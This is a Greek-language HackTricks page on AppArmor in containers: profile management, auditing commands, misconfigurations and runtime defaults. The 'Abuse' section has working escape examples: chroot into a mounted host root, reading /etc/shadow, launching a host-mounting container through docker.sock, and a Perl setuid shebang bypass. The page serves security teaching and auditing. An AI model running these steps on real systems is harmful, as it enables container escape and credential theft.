# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το AppArmor είναι ένα σύστημα **Υποχρεωτικού Ελέγχου Πρόσβασης** που επιβάλλει περιορισμούς μέσω προφίλ ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, που εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρηστών και ομάδων, το AppArmor επιτρέπει στον πυρήνα να εφαρμόζει μια πολιτική συνδεδεμένη στη διεργασία καθαυτή. Σε περιβάλλοντα container, αυτό έχει σημασία γιατί ένα workload μπορεί να έχει αρκετά παραδοσιακά προνόμια για να επιχειρήσει μια ενέργεια και παρ' όλα αυτά να του αρνηθείται η πρόσβαση επειδή το προφίλ του AppArmor δεν επιτρέπει την αντίστοιχη διαδρομή, mount, συμπεριφορά δικτύου ή χρήση capability.

## Ρόλος στην απομόνωση container

Οι έλεγχοι ασφαλείας container συχνά περιορίζονται σε capabilities και seccomp, αλλά το AppArmor εξακολουθεί να έχει σημασία μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container που έχει περισσότερα προνόμια απ' όσα θα έπρεπε, ή ένα workload που χρειάστηκε ένα επιπλέον capability για λειτουργικούς λόγους. Το AppArmor μπορεί να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά mount, τη δικτύωση και τα πρότυπα εκτέλεσης με τρόπους που εμποδίζουν την προφανή οδό κατάχρησης. Γι' αυτό η απενεργοποίηση του AppArmor «μόνο και μόνο για να λειτουργήσει η εφαρμογή» μπορεί αθόρυβα να μετατρέψει μια απλώς επικίνδυνη ρύθμιση σε μία που είναι ενεργά εκμεταλλεύσιμη.

## Εργαστήριο

Για να ελέγξετε αν το AppArmor είναι ενεργό στον host, χρησιμοποιήστε:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Για να δείτε υπό ποιον εκτελείται η τρέχουσα διεργασία του container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Η διαφορά είναι διδακτική. Στην κανονική περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα AppArmor context δεμένο με το profile που επιλέχθηκε από το runtime. Στην περίπτωση unconfined, αυτό το επιπλέον επίπεδο περιορισμού εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι νομίζει ότι εφάρμοσε το Docker:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Χρήση κατά την εκτέλεση

Το Docker μπορεί να εφαρμόσει ένα προεπιλεγμένο ή προσαρμοσμένο AppArmor profile όταν ο host το υποστηρίζει. Το Podman μπορεί επίσης να ενσωματωθεί με AppArmor σε συστήματα βασισμένα σε AppArmor, αν και σε διανομές που δίνουν προτεραιότητα στο SELinux το άλλο MAC σύστημα συχνά έρχεται στο προσκήνιο. Το Kubernetes μπορεί να εκθέσει AppArmor policy σε επίπεδο workload σε nodes που πράγματι υποστηρίζουν AppArmor. Το LXC και σχετικά περιβάλλοντα system-container της οικογένειας Ubuntu χρησιμοποιούν επίσης εκτενώς AppArmor.

Το πρακτικό σημείο είναι ότι το AppArmor δεν είναι ένα "Docker feature". Είναι ένα χαρακτηριστικό του host-kernel που αρκετά runtimes μπορούν να επιλέξουν να εφαρμόσουν. Αν ο host δεν το υποστηρίζει ή αν στο runtime έχει δοθεί εντολή να τρέξει unconfined, η υποτιθέμενη προστασία στην πραγματικότητα δεν υπάρχει.

Σε hosts με AppArmor που μπορούν να τρέξουν Docker, το πιο γνωστό προεπιλεγμένο είναι `docker-default`. Αυτό το profile παράγεται από το AppArmor template του Moby και είναι σημαντικό γιατί εξηγεί γιατί κάποια capability-based PoCs εξακολουθούν να αποτυγχάνουν σε ένα default container. Με γενικούς όρους, το `docker-default` επιτρέπει την κανονική δικτύωση, αρνείται εγγραφές σε μεγάλο μέρος του `/proc`, αρνείται πρόσβαση σε ευαίσθητα τμήματα του `/sys`, μπλοκάρει ενέργειες mount και περιορίζει το ptrace ώστε να μην είναι γενικό primitive για probing του host. Η κατανόηση αυτής της βάσης βοηθά να διαχωριστεί το "the container has `CAP_SYS_ADMIN`" από το "the container can actually use that capability against the kernel interfaces I care about".

## Profile Management

Τα AppArmor profiles συνήθως αποθηκεύονται κάτω από το `/etc/apparmor.d/`. Μια κοινή σύμβαση ονοματοδοσίας είναι να αντικαθίστανται οι κάθετες (/) στη διαδρομή του εκτελέσιμου με τελείες. Για παράδειγμα, ένα profile για `/usr/bin/man` συνήθως αποθηκεύεται ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο για την άμυνα όσο και για την αξιολόγηση, γιατί μόλις γνωρίζετε το ενεργό όνομα προφίλ, συχνά μπορείτε να εντοπίσετε το αντίστοιχο αρχείο γρήγορα στον host.

Χρήσιμες εντολές διαχείρισης στον host περιλαμβάνουν:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Ο λόγος που αυτές οι εντολές έχουν σημασία σε μια αναφορά για την ασφάλεια κοντέινερ είναι ότι εξηγούν πώς τα προφίλ κατασκευάζονται πραγματικά, φορτώνονται, μεταβαίνουν σε complain mode και τροποποιούνται μετά από αλλαγές στην εφαρμογή. Εάν ένας χειριστής έχει τη συνήθεια να μεταφέρει τα προφίλ σε complain mode κατά τη διάρκεια troubleshooting και να ξεχνά να επαναφέρει την enforcement, το κοντέινερ μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση ενώ στην πραγματικότητα να συμπεριφέρεται πολύ πιο χαλαρά.

### Δημιουργία και Ενημέρωση προφίλ

`aa-genprof` μπορεί να παρατηρήσει τη συμπεριφορά της εφαρμογής και να βοηθήσει στη δημιουργία ενός προφίλ διαδραστικά:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο προφίλ που μπορεί αργότερα να φορτωθεί με `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Όταν το binary αλλάζει και η πολιτική χρειάζεται ενημέρωση, `aa-logprof` μπορεί να αναπαράγει τις απορρίψεις που βρέθηκαν στα logs και να βοηθήσει τον χειριστή να αποφασίσει αν θα τις επιτρέψει ή θα τις απορρίψει:
```bash
sudo aa-logprof
```
### Καταγραφές

Οι απορρίψεις του AppArmor είναι συχνά ορατές μέσω του `auditd`, του syslog ή εργαλείων όπως το `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Αυτό είναι χρήσιμο επιχειρησιακά και σε επιθετικό επίπεδο. Οι defenders το χρησιμοποιούν για να βελτιώσουν τα προφίλ. Οι attackers το χρησιμοποιούν για να μάθουν ποιο ακριβώς path ή operation απορρίπτεται και αν το AppArmor είναι ο έλεγχος που μπλοκάρει μια exploit chain.

### Προσδιορισμός του Ακριβούς Αρχείου Προφίλ

Όταν ένα runtime εμφανίζει ένα συγκεκριμένο όνομα AppArmor profile για ένα container, συχνά είναι χρήσιμο να αντιστοιχίσετε αυτό το όνομα στο αντίστοιχο αρχείο προφίλ στον δίσκο:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Αυτό είναι ιδιαίτερα χρήσιμο κατά την host-side review επειδή γεφυρώνει το χάσμα μεταξύ "the container says it is running under profile `lowpriv`" και "the actual rules live in this specific file that can be audited or reloaded".

## Λανθασμένες ρυθμίσεις

Το πιο προφανές λάθος είναι `apparmor=unconfined`. Οι administrators συχνά το θέτουν ενώ κάνουν debugging μιας εφαρμογής που απέτυχε επειδή το profile μπλόκαρε σωστά κάτι επικίνδυνο ή απρόσμενο. Εάν η σημαία παραμείνει σε production, ολόκληρο το MAC layer έχει ουσιαστικά αφαιρεθεί.

Ένα ακόμα πιο λεπτό πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι ακίνδυνα επειδή τα δικαιώματα αρχείων φαίνονται φυσιολογικά. Εφόσον AppArmor είναι path-based, η έκθεση host paths κάτω από εναλλακτικές τοποθεσίες mount μπορεί να αλληλεπιδράσει αρνητικά με τους κανόνες path. Ένα τρίτο λάθος είναι το να ξεχνάτε ότι ένα όνομα profile σε ένα config file σημαίνει πολύ λίγα αν ο host kernel δεν εφαρμόζει πραγματικά το AppArmor.

## Κατάχρηση

Όταν το AppArmor λείπει, λειτουργίες που προηγουμένως ήταν περιορισμένες μπορεί ξαφνικά να δουλέψουν: ανάγνωση ευαίσθητων paths μέσω bind mounts, πρόσβαση σε τμήματα του procfs ή sysfs που θα έπρεπε να ήταν δυσκολότερο να χρησιμοποιηθούν, εκτέλεση ενεργειών σχετικών με mount εάν capabilities/seccomp επίσης το επιτρέπουν, ή χρήση paths που ένα profile κανονικά θα απαγόρευε. Το AppArmor είναι συχνά ο μηχανισμός που εξηγεί γιατί μια προσπάθεια breakout βασισμένη σε capabilities "should work" στο χαρτί αλλά αποτυγχάνει στην πράξη. Αφαιρέστε το AppArmor, και η ίδια προσπάθεια μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι το κύριο εμπόδιο σε μια αλυσίδα κατάχρησης τύπου path-traversal, bind-mount, ή mount-based, το πρώτο βήμα είναι συνήθως να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς ένα profile. Για παράδειγμα, αν ένα host path είναι mounted μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να το διασχίσετε και να το διαβάσετε:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Εάν το container διαθέτει επίσης μια επικίνδυνη capability όπως `CAP_SYS_ADMIN`, μία από τις πιο πρακτικές δοκιμές είναι να ελέγξουμε αν το AppArmor είναι ο μηχανισμός που μπλοκάρει ενέργειες mount ή την πρόσβαση σε ευαίσθητα kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Σε περιβάλλοντα όπου μια διαδρομή host είναι ήδη διαθέσιμη μέσω ενός bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα μόνο για ανάγνωση πρόβλημα αποκάλυψης πληροφοριών σε άμεση πρόσβαση σε αρχεία του host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Ο σκοπός αυτών των εντολών δεν είναι ότι το AppArmor από μόνο του δημιουργεί το breakout. Η ουσία είναι ότι μόλις το AppArmor αφαιρεθεί, πολλές διαδρομές κατάχρησης που βασίζονται στο filesystem και στα mounts γίνονται άμεσα ελέγξιμες.

### Πλήρες παράδειγμα: AppArmor απενεργοποιημένο + root του host προσαρτημένο

Αν το container έχει ήδη το host root bind-mounted στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει μια μπλοκαρισμένη διαδρομή κατάχρησης του filesystem σε πλήρες host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Μόλις το shell εκτελείται μέσω του host filesystem, το workload έχει ουσιαστικά διαφύγει από τα όρια του container:
```bash
id
hostname
cat /etc/shadow | head
```
### Πλήρες Παράδειγμα: AppArmor απενεργοποιημένο + Runtime Socket

Αν το πραγματικό εμπόδιο ήταν το AppArmor γύρω από το runtime state, ένα mounted socket μπορεί να είναι αρκετό για πλήρη απόδραση:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Η ακριβής διαδρομή εξαρτάται από το mount point, αλλά το τελικό αποτέλεσμα είναι το ίδιο: το AppArmor δεν αποτρέπει πλέον την πρόσβαση στο runtime API, και το runtime API μπορεί να εκκινήσει ένα host-compromising container.

### Πλήρες Παράδειγμα: Path-Based Bind-Mount Bypass

Επειδή το AppArmor είναι path-based, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο host procfs περιεχόμενο όταν είναι προσβάσιμο μέσω διαφορετικής διαδρομής:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Το αποτέλεσμα εξαρτάται από το τι ακριβώς είναι mounted και εάν η εναλλακτική διαδρομή παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους πιο ξεκάθαρους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται μαζί με το mount layout και όχι απομονωμένα.

### Πλήρες Παράδειγμα: Shebang Bypass

Η πολιτική του AppArmor κάποιες φορές στοχοποιεί μια διαδρομή interpreter με τρόπο που δεν λαμβάνει πλήρως υπόψη την εκτέλεση script μέσω του χειρισμού του shebang. Ένα ιστορικό παράδειγμα περιελάμβανε τη χρήση ενός script του οποίου η πρώτη γραμμή δείχνει σε έναν περιορισμένο interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Αυτό το είδος παραδείγματος είναι σημαντικό ως υπενθύμιση ότι ο σκοπός ενός profile και η πραγματική σημασιολογία εκτέλεσης μπορούν να αποκλίνουν. Κατά την ανασκόπηση του AppArmor σε περιβάλλοντα container, τα interpreter chains και οι εναλλακτικές διαδρομές εκτέλεσης αξίζουν ιδιαίτερη προσοχή.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντηθούν γρήγορα τρία ερωτήματα: είναι το AppArmor ενεργοποιημένο στον host; είναι η τρέχουσα process confined; και εφαρμόστηκε πραγματικά ένα profile σε αυτό το container από το runtime;
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Τι είναι ενδιαφέρον εδώ:

- Αν το `/proc/self/attr/current` εμφανίζει `unconfined`, το workload δεν επωφελείται από την επιβολή περιορισμών του AppArmor.
- Αν το `aa-status` δείχνει ότι το AppArmor είναι απενεργοποιημένο ή δεν έχει φορτωθεί, οποιοδήποτε όνομα προφίλ στη runtime διαμόρφωση είναι κυρίως διακοσμητικό.
- Αν το `docker inspect` εμφανίζει `unconfined` ή ένα απρόσμενο custom profile, αυτό συχνά εξηγεί γιατί λειτουργεί ένα abuse path που βασίζεται σε filesystem ή mount.

Εάν ένα container έχει ήδη αυξημένα προνόμια για επιχειρησιακούς λόγους, το να παραμείνει το AppArmor ενεργό συχνά κάνει τη διαφορά μεταξύ μιας ελεγχόμενης εξαίρεσης και μιας πολύ ευρύτερης αποτυχίας ασφαλείας.

## Προεπιλογές χρόνου εκτέλεσης

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Ενεργό εξ ορισμού σε hosts που υποστηρίζουν AppArmor | Χρησιμοποιεί το προφίλ AppArmor `docker-default`, εκτός αν παρακαμφθεί | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Εξαρτάται από τον host | Το AppArmor υποστηρίζεται μέσω `--security-opt`, αλλά η ακριβής προεπιλογή εξαρτάται από το host/runtime και είναι λιγότερο καθολική σε σύγκριση με το τεκμηριωμένο προφίλ `docker-default` του Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Προεπιλογή υπό όρους | Αν το `appArmorProfile.type` δεν ορίζεται, η προεπιλογή είναι `RuntimeDefault`, αλλά εφαρμόζεται μόνο όταν το AppArmor είναι ενεργό στον κόμβο | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` με αδύναμο προφίλ, κόμβοι χωρίς υποστήριξη AppArmor |
| containerd / CRI-O υπό Kubernetes | Ακολουθεί την υποστήριξη του κόμβου/runtime | Οι συνήθεις runtimes που υποστηρίζονται από Kubernetes υποστηρίζουν AppArmor, αλλά η πραγματική επιβολή εξαρτάται από την υποστήριξη του κόμβου και τις ρυθμίσεις του workload | Όπως στη γραμμή Kubernetes· η άμεση διαμόρφωση runtime μπορεί επίσης να παρακάμψει πλήρως το AppArmor |

Για το AppArmor, η πιο σημαντική μεταβλητή είναι συχνά ο **host**, όχι μόνο το runtime. Μια ρύθμιση προφίλ σε ένα manifest δεν δημιουργεί confinement σε έναν κόμβο όπου το AppArmor δεν είναι ενεργοποιημένο.
{{#include ../../../../banners/hacktricks-training.md}}
